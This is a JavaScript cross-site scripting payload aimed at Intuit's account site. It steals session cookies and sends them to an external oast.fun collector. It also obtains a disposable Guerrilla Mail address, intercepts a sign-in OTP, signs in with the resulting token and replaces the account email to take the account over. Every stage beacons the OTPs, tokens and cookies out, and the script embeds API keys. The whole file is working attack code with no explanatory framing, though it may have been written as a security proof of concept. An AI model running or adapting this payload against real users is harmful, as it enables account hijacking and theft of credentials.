(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var W='https://atmeta-wildcard-monitor.nasseurpay.workers.dev/?url=';
var G='https://api.guerrillamail.com/ajax.php';
var out=[];

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}
function beacon(tag,data){(new Image).src=O+'/'+tag+'?d='+encodeURIComponent((data||'').substring(0,900))}
function render(){
try{
if(!document.body){document.documentElement.appendChild(document.createElement('body'))}
document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'+out.join('\n')+'</pre>';
}catch(e){}
}
function log(msg){out.push(msg);render()}
function wp(url){
return fetch(W+encodeURIComponent(url)).then(function(r){
if(!r.ok)throw new Error('proxy '+r.status);
return r.text()
})
}
function uuid(){return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c==='x'?r:r&3|8).toString(16)})}

var session=gc('ius_session');
var visitorId=gc('ivid');

beacon('p21-start',session.substring(0,30));
(new Image).src=O+'/p21-cookies?c='+encodeURIComponent(document.cookie.substring(0,2000));

var hdrs={
'Content-Type':'application/json',
'authorization':'Intuit_APIKey intuit_apikey=prdakyres3YphxpI5f5NhtHOzVAHTTAuQmL8UmCB, intuit_apikey_version=1.0',
'intuit_sessionid':session,
'intuit_profilingid':session,
'intuit_visitorid':visitorId,
'intuit_flowid':uuid(),
'intuit_offeringid':'Intuit.identity.experiences.oneintuitam',
'intuit_intentassetalias':'Intuit.identity.experiences.oneintuitam',
'intuit_origin':'https://accounts.intuit.com',
'intuit_country':'US',
'intuit_locale':'en-gb',
'intuit_offeringenv':'prd',
'intuit_authn_session_slot':'qbn',
'intuit_samesite_support':'true',
'intuit_identity_routing':'SBSEG',
'intuit_interception':'ignore-response',
'intuit_baggage':btoa(JSON.stringify({scope_area:'remediation',additional_fields:{}}))
};

log('[*] XSS on '+location.origin);
log('');
log('[0] Getting temp email...');

wp(G+'?f=get_email_address')
.then(function(raw){
var data=JSON.parse(raw);
var email=data.email_addr;
var sid=data.sid_token;
log('[0] Email: '+email);
beacon('p21-email',email);

log('[1] Calling initialize...');
return fetch('/factors/v1/verifier/initialize/email',{
method:'POST',headers:hdrs,credentials:'include',
body:JSON.stringify({verifierPolicyId:'emailOtpSignIn',emailAddress:email})
}).then(function(r){return r.json()}).then(function(d){
if(!d.verifierSessionId)throw new Error('no vsid');
var vsid=d.verifierSessionId;
log('[1] vsid: '+vsid);
log('[1] OTP sent to: '+email);
beacon('p21-init',vsid);

log('[2] Polling for OTP...');
var attempt=0;
function poll(){
attempt++;
return wp(G+'?f=check_email&seq=0&sid_token='+encodeURIComponent(sid))
.then(function(raw){
var resp=JSON.parse(raw);
var list=resp.list||[];
log('[2] Poll #'+attempt+': '+list.length+' emails');
if(list.length>0){
var found=null;
for(var i=0;i<list.length;i++){
var subj=(list[i].mail_subject||'').toLowerCase();
if(subj.indexOf('welcome to guerrilla')!==-1)continue;
found=list[i];break
}
if(found){
log('[2] Got: '+found.mail_subject);
return wp(G+'?f=fetch_email&email_id='+found.mail_id+'&sid_token='+encodeURIComponent(sid))
.then(function(r2){return JSON.parse(r2)})
}
}
if(attempt>=60)throw new Error('timeout');
return new Promise(function(res){setTimeout(function(){res(poll())},3000)})
})
}

return poll().then(function(msg){
var body=(msg.mail_body||'').replace(/<[^>]*>/g,' ');
var m=body.match(/\b(\d{6})\b/);
var otp=m?m[1]:null;
if(!otp)throw new Error('no OTP');
log('[2] OTP: '+otp);
beacon('p21-otp',otp);

log('[3] Verifying OTP...');
return fetch('/factors/v1/verifier/verify/email',{
method:'POST',headers:hdrs,credentials:'include',
body:JSON.stringify({verifierSessionId:vsid,otp:otp})
}).then(function(r){return r.json()}).then(function(vd){
if(!vd.verifierToken)throw new Error('no token: '+JSON.stringify(vd));
var vt=vd.verifierToken;
log('[3] Got verifierToken');
beacon('p21-vt',vt.substring(0,100));

log('[4] SignInWithVerifierToken...');
var signInQuery='mutation SignInWithVerifierToken($input:Identity_BrowserSignInWithVerifierTokenInput!){identityBrowserSignInWithVerifierToken(input:$input){__typename ...on Identity_BrowserSignInWithVerifierTokenNothingElseRequired{__typename successCode authenticationSession{digitalIdentity{legacyAuthId pseudonymId}}}...on Identity_BrowserSignInWithVerifierTokenAccessDenied{__typename}...on Identity_BrowserSignInWithVerifierTokenSomethingElseRequired{__typename}...on Identity_SignInError{__typename}}}';

return fetch('/identity-api/signin/graphql',{
method:'POST',headers:hdrs,credentials:'include',
body:JSON.stringify({
query:signInQuery,
variables:{input:{
intent:{appGroup:'',assetAlias:'Intuit.identity.experiences.oneintuitam',securityCategory:'ORANGE',redirectUri:'https://accounts.intuit.com/app/account-manager/security/email',rememberMe:false},
clientCapabilitySet:'v13',
finalSlotNames:['qbn'],
deviceCapabilities:{passkeySupported:false,simTs43Supported:true},
inputSlotName:'qbn',
tenantIds:['50000003'],
verifierToken:vt
}}
})
}).then(function(r){return r.text()}).then(function(sr){
log('[4] Response: '+sr.substring(0,200));
beacon('p21-signin',sr.substring(0,400));

var srd;try{srd=JSON.parse(sr)}catch(e){}
var authId='';
if(srd&&srd.data){
var res=srd.data.identityBrowserSignInWithVerifierToken;
if(res&&res.authenticationSession&&res.authenticationSession.digitalIdentity){
authId=res.authenticationSession.digitalIdentity.legacyAuthId||'';
}
}

var postSigninSession=gc('ius_session');
log('[4] authId: '+authId);
log('[4] ius_session after signin: '+postSigninSession.substring(0,20)+'...');

log('[4.5] Following sign-in redirect...');
var redirectUrl='/app/sign-in?app_group=Identity&asset_alias=Intuit.cto.iam.ius&start_screen_hint=SignIn&iux_auto_off=true&redirect_url='+encodeURIComponent('https://accounts.intuit.com/app/account-manager/security/email');

return fetch(redirectUrl,{
credentials:'include',
redirect:'follow'
}).then(function(r){
log('[4.5] Redirect status: '+r.status);
var redirectSession=gc('ius_session');
var diSession=gc('di_session');
log('[4.5] ius_session after redirect: '+redirectSession.substring(0,20)+'...');
log('[4.5] di_session: '+diSession.substring(0,20)+(diSession?'...':'(empty)'));
beacon('p21-redirect-cookies',document.cookie.substring(0,900));

log('[5] ReplaceEmail...');
var finalSession=gc('ius_session');
var replaceHdrs={
'Content-Type':'application/json',
'authorization':'Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0',
'intuit_sessionid':finalSession,
'intuit_profilingid':finalSession,
'intuit_visitorid':visitorId,
'intuit_flowid':uuid(),
'intuit_offeringid':'Intuit.cto.iam.ius',
'intuit_intentassetalias':'Intuit.cto.iam.ius',
'intuit_baggage':btoa(JSON.stringify({scope_area:'account_manager'})),
'intuit_tid':uuid()
};
if(authId)replaceHdrs['intuit_routingid']=authId;

var replaceQuery='mutation ReplaceEmail($input:Identity_CreateOrReplaceEmailCredentialInput!){identityCreateOrReplaceEmailCredential(input:$input){__typename ...on Identity_CreateOrReplaceEmailCredentialSuccess{status}...on Identity_CredentialUnauthorizedError{message}...on Identity_CredentialInvalidInputError{message}...on Identity_DigitalIdentityLockedOutError{message}}}';

return fetch('/identity-api/v2/graphql',{
method:'POST',headers:replaceHdrs,credentials:'include',
body:JSON.stringify({
query:replaceQuery,
variables:{input:{newEmailAddress:email}},
operationName:'ReplaceEmail'
})
}).then(function(r){return r.text()}).then(function(rr){
log('[5] Response: '+rr);
beacon('p21-replace',rr.substring(0,400));
var rrd;try{rrd=JSON.parse(rr)}catch(e){}
if(rrd&&rrd.data&&rrd.data.identityCreateOrReplaceEmailCredential){
var t=rrd.data.identityCreateOrReplaceEmailCredential.__typename;
if(t==='Identity_CreateOrReplaceEmailCredentialSuccess'){
log('');
log('=== EMAIL CHANGED TO: '+email+' ===');
beacon('p21-done','SUCCESS email='+email);
}else{
log('[!] ReplaceEmail failed: '+t+' — '+(rrd.data.identityCreateOrReplaceEmailCredential.message||''));
beacon('p21-fail',t);
}
}else{
log('[!] Unexpected response');
beacon('p21-fail','unexpected');
}
})
})
})
})
})
})
})
.catch(function(err){
log('[!] ERROR: '+err.message);
beacon('p21-err',err.message);
});

}catch(e){
(new Image).src='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun/p21-crash?e='+encodeURIComponent(e.message);
}
})();
